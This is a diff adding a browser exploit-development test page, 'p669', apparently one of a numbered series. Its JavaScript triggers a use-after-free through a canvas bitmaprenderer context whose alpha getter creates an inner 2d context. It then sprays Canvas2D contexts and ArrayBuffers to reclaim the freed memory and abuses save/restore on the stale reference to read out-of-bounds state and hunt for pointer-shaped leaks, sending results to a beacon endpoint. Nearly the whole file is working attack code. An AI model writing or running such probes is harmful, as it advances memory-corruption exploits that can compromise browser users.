@@ -1,0 +1,270 @@
+<!--
+  p669: OOB state stack read — correct UAF flow
+  p668 showed: accessing stale ref BEFORE spray = instant crash (freed vtable).
+  Must follow p635 flow: UAF trigger → spray → then access stale ref.
+  
+  Flow:
+  1. bitmaprenderer + alpha getter → inner 2d created + freed
+  2. Spray 150 Canvas2D contexts → one reclaims the 768B slot  
+  3. NOW access the stale inner ref (reads from reclaimed context)
+  4. save() on stale ref → pushes to reclaimed context's state stack
+  5. Read properties → do they come from the reclaimed context or OOB?
+  
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p669</title></head>
+<body>p669: OOB statestack v3
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;var b=bQ.splice(0,2).join('|');try{var x=new XMLHttpRequest();x.open('GET','/beacon/P669-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,120));flush();};
+var f64=new Float64Array(1),u8=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8[i].toString(16)).slice(-2);return h;}
+
+emit('START','v1');flush();
+
+// ================================================================
+// PHASE A: UAF + spray + then save/read on stale ref
+// Follow p635's exact proven pattern
+// ================================================================
+try{
+  var canv=document.createElement('canvas');
+  canv.width=4;canv.height=4;
+  var inner=null;
+
+  emit('A1','uaf-trigger');flush();
+  var outer=canv.getContext('bitmaprenderer',{
+    get alpha(){
+      inner=canv.getContext('2d');
+      return true;
+    }
+  });
+  emit('A2','inner='+(inner?'yes':'no'));flush();
+
+  // Spray FIRST — reclaim the freed 768B slot
+  emit('A3','spraying-150');flush();
+  var spray=[];
+  for(var i=0;i<150;i++){
+    var c=document.createElement('canvas');
+    c.width=4;c.height=4;
+    spray.push(c.getContext('2d'));
+  }
+  emit('A4','spray-done');flush();
+
+  // Now the stale inner ref points to a reclaimed context
+  // Read baseline values
+  emit('A5','read-baseline');flush();
+  var lw0=inner.lineWidth;
+  emit('A6-LW','val='+lw0+',hex='+d2hex(lw0));flush();
+
+  var ga0=inner.globalAlpha;
+  emit('A7-GA','val='+ga0);flush();
+
+  // Set known values on stale ref (writes to reclaimed context)
+  emit('A8','set-values');flush();
+  inner.lineWidth=42.5;
+  inner.globalAlpha=0.777;
+  emit('A9','lw='+inner.lineWidth+',ga='+inner.globalAlpha);flush();
+
+  // Save — pushes state on the reclaimed context's stack
+  emit('A10','save-1');flush();
+  inner.save();
+  inner.lineWidth=11.11;
+  emit('A11','saved,lw='+inner.lineWidth);flush();
+
+  // Save again
+  emit('A12','save-2');flush();
+  inner.save();
+  inner.lineWidth=22.22;
+  emit('A13','saved,lw='+inner.lineWidth);flush();
+
+  // Now: state stack has 3 entries (initial + 2 saves)
+  // Read transform at this level
+  emit('A14','read-transform');flush();
+  var tx=inner.getTransform();
+  emit('A15-TX','a='+tx.a+',d='+tx.d+',e='+tx.e+',f='+tx.f);flush();
+
+  // Restore once
+  emit('A16','restore-1');flush();
+  inner.restore();
+  var lw1=inner.lineWidth;
+  emit('A17-R1','lw='+lw1+',hex='+d2hex(lw1));flush();
+
+  // Restore again
+  emit('A18','restore-2');flush();
+  inner.restore();
+  var lw2=inner.lineWidth;
+  emit('A19-R2','lw='+lw2+',hex='+d2hex(lw2));flush();
+
+  // Extra restore (should be at bottom of stack)
+  emit('A20','restore-3-extra');flush();
+  inner.restore();
+  var lw3=inner.lineWidth;
+  emit('A21-R3','lw='+lw3+',hex='+d2hex(lw3));flush();
+
+  emit('A-OK','baseline-flow-complete');flush();
+
+}catch(e){emit('A-ERR',e.name+':'+e.message);flush();}
+
+// ================================================================
+// PHASE B: Many saves to force Vector realloc, then read after realloc
+// ================================================================
+try{
+  emit('B1','new-uaf');flush();
+  var canv2=document.createElement('canvas');
+  canv2.width=4;canv2.height=4;
+  var inner2=null;
+  var outer2=canv2.getContext('bitmaprenderer',{
+    get alpha(){
+      inner2=canv2.getContext('2d');
+      return true;
+    }
+  });
+  emit('B2','inner2='+(inner2?'yes':'no'));flush();
+
+  // Spray
+  var spray2=[];
+  for(var i=0;i<150;i++){
+    var c=document.createElement('canvas');
+    c.width=4;c.height=4;
+    spray2.push(c.getContext('2d'));
+  }
+  emit('B3','spray2-done');flush();
+
+  // Read baseline
+  var bLw=inner2.lineWidth;
+  emit('B4-BL','lw='+bLw);flush();
+
+  // Set marker and save MANY times — forces Vector<State> realloc
+  inner2.lineWidth=77.77;
+  emit('B5','saving-x16');flush();
+  for(var i=0;i<16;i++){
+    inner2.save();
+    inner2.lineWidth=100+i;
+  }
+  emit('B6','saves-done,lw='+inner2.lineWidth);flush();
+
+  // The Vector backing store has been reallocated (grown).
+  // Old backing store is freed.
+  // Now spray ABs to reclaim old backing store
+  emit('B7','ab-spray');flush();
+  var abSpray=[];
+  for(var i=0;i<200;i++){
+    var ab=new ArrayBuffer(256);
+    var dv=new Float64Array(ab);
+    // Fill with recognizable pattern
+    for(var j=0;j<32;j++) dv[j]=0xCAFE0000+i+j*0.001;
+    abSpray.push({ab:ab,dv:dv});
+  }
+  emit('B8','ab-spray-done');flush();
+
+  // Restore all 16 saves — reads from current (grown) Vector
+  // Then restore past the original save count — what happens?
+  var restoreVals=[];
+  for(var i=0;i<20;i++){
+    try{
+      inner2.restore();
+      restoreVals.push({i:i,lw:inner2.lineWidth,hex:d2hex(inner2.lineWidth)});
+    }catch(e){
+      restoreVals.push({i:i,err:e.name});
+      break;
+    }
+  }
+  for(var k=0;k<restoreVals.length;k++){
+    var r=restoreVals[k];
+    if(r.err) emit('B-R'+k,'ERR:'+r.err);
+    else emit('B-R'+k,'lw='+r.lw+',hex='+r.hex);
+  }
+
+  // Check for CAFE pattern (from our AB spray)
+  var cafeHits=restoreVals.filter(function(r){
+    return !r.err && r.lw>=0xCAFE0000;
+  });
+  if(cafeHits.length>0){
+    emit('B-VERDICT','AB-DATA-IN-STATESTACK — old Vector backing reclaimed!');
+  }
+
+  // Check for any unexpected values
+  var unexpected=restoreVals.filter(function(r){
+    if(r.err) return false;
+    var lw=r.lw;
+    return lw!==77.77 && lw!==1 && (lw<100||lw>115) && lw!==0;
+  });
+  if(unexpected.length>0){
+    emit('B-VERDICT','UNEXPECTED — '+unexpected.length+' anomalous values');
+    for(var k=0;k<Math.min(unexpected.length,5);k++)
+      emit('B-UNEXP','i='+unexpected[k].i+',lw='+unexpected[k].lw+',hex='+unexpected[k].hex);
+  } else if(cafeHits.length===0){
+    emit('B-VERDICT','all-expected-values');
+  }
+
+}catch(e){emit('B-ERR',e.name+':'+e.message);flush();}
+
+// ================================================================
+// PHASE C: Read ALL 13 numeric properties at deep save level
+// Look for any that contain pointer-shaped data
+// ================================================================
+try{
+  emit('C1','all-props-deep');flush();
+  var canv3=document.createElement('canvas');
+  canv3.width=4;canv3.height=4;
+  var inner3=null;
+  var outer3=canv3.getContext('bitmaprenderer',{
+    get alpha(){
+      inner3=canv3.getContext('2d');
+      return true;
+    }
+  });
+
+  var spray3=[];
+  for(var i=0;i<150;i++){
+    var c=document.createElement('canvas');
+    c.width=4;c.height=4;
+    spray3.push(c.getContext('2d'));
+  }
+  emit('C2','spray3-done');flush();
+
+  // 30 saves
+  for(var i=0;i<30;i++) inner3.save();
+  emit('C3','30-saves-done');flush();
+
+  // Read all properties at deep level
+  var props=['lineWidth','miterLimit','globalAlpha','shadowBlur',
+             'shadowOffsetX','shadowOffsetY','lineDashOffset'];
+  for(var p=0;p<props.length;p++){
+    try{
+      var v=inner3[props[p]];
+      var h=d2hex(v);
+      var flag='';
+      if(v!==1&&v!==0&&v!==10&&h!=='3ff0000000000000'&&h!=='0000000000000000')
+        flag=' ***';
+      emit('C-'+props[p],'val='+v+',hex='+h+flag);
+    }catch(e){emit('C-'+props[p],'ERR:'+e.name);}
+  }
+  flush();
+
+  // Transform
+  try{
+    var tx=inner3.getTransform();
+    var txProps={a:tx.a,b:tx.b,c:tx.c,d:tx.d,e:tx.e,f:tx.f};
+    for(var k in txProps){
+      var v=txProps[k];
+      var h=d2hex(v);
+      var expected=(k==='a'||k==='d')?1:0;
+      var flag=(v!==expected)?(' ***'):'';
+      emit('C-tx.'+k,'val='+v+',hex='+h+flag);
+    }
+  }catch(e){emit('C-tx','ERR:'+e.name);}
+  flush();
+
+}catch(e){emit('C-ERR',e.name+':'+e.message);flush();}
+
+emit('DONE','p669-complete');flush();
+})();
+</script>
+</body>
+</html>
